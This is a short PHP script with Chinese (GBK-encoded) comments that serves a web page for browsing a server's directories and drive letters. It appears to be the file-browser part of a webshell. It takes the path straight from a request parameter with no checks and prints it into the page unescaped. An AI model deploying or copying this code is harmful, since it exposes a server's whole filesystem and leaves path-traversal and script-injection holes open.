b'<?\nerror_reporting(1);\n//\xc1\xd0\xc4\xbf\xc2\xbc\xba\xaf\xca\xfd\nfunction dirlist($cd){\n        $dh = opendir($cd);\n        while($dl = readdir($dh)){\n                $dla[] = $dl;\n        }\n        foreach($dla as $d){\n                if(!is_file($cd.$d)&&$d!="."){\n                        $content.="<a href=\'?newdir=".$cd.$d."\'>".$d."</a>"."<br />";\n                }\n        }\n        foreach($dla as $d){\n                if(is_file($cd.$d)){\n                        $content.=$d."<br />";\n                }\n        }\n        return $content;\n}\n//\xc1\xd0\xb3\xf6\xc5\xcc\xb7\xfb\xba\xaf\xca\xfd\nfunction listDisk(){\n        $letters = range(\'b\',\'z\');\n        foreach($letters as $l){\n                if(is_dir($l.":")){\n                        $dlist.= "[<a href=\'?newdir=".$l.":\'>".$l."\xc5\xcc</a>]";\n                }\n        }\n        echo $dlist;\n}\n//\xb3\xa3\xc1\xbf\xb6\xa8\xd2\xe5\n$rd = $_SERVER[\'DOCUMENT_ROOT\'];\n$fd = $rd.substr($_SERVER[\'PHP_SELF\'],0,strrpos($_SERVER[\'PHP_SELF\'],"/"));\n        \n        if(!isset($_REQUEST[\'action\'])){\n                $ac = "dirlist";\n        }else{\n                $ac = $_REQUEST[\'action\'];\n        }\n        if(!isset($_REQUEST[\'newdir\'])){\n                $cd = getcwd()."\\\\";\n        }else{\n                $cd = $_REQUEST[\'newdir\']."\\\\";\n                chdir($cd);\n                $cd = getcwd()."\\\\";\n        }\n        switch($ac){\n                case "dirlist":$content = dirlist($cd);break;\n        }\n?>\n<html>\n<style>\nbody{\n        background-color:#000000;\n        color:#FFFFFF;\n}\na{\n        color:#CC9900;\n}\n</style>\n<body>\n<div id="main">\n    <div>\n    <form name="form1" method="get" action="">\n      <label>\n      <input name="newdir" type="text" value="<?=$cd?>" size="60">\n      </label>\n      <label>\n      <input type="submit" value="\xcc\xe1\xbd\xbb">\n      </label>\n    </form>\n    </div>\n    <hr color="#FFFFFF" />\n  <div id="gongneng">\xce\xc4\xbc\xfe\xc4\xbf\xc2\xbc\xa3\xba[<a href="?newdir=<?=$rd?>">\xd5\xbe\xb5\xe3\xb8\xf9\xc4\xbf\xc2\xbc</a>][<a href="?newdir=<?=$fd?>">\xb1\xbe\xce\xc4\xbc\xfe\xc4\xbf\xc2\xbc</a>]<? listDisk(); ?></div>\n        <hr color="#FFFFFF" />\n    <div><?=$content?></div>\n</div>\n</body>\n</html>'